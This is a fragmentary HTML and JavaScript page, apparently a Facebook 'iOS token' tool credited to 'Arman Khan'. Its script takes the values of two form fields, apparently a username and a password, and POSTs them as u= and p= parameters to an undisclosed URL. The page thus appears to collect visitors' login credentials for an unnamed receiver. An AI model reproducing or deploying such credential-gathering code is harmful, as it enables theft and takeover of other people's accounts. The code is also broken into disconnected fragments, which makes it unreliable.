...
target="blank">zain aqdas II</a>
       <Br>
     <Br>   
<a href="https://www.Facebook.com/100009434565722" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">
</div>
    </div>
</div>
...
var message="DESIGNED BY Arman Khan"
var neonbasecolor=""
...
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "IOS TOKEN BY ARMAN KHAN";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
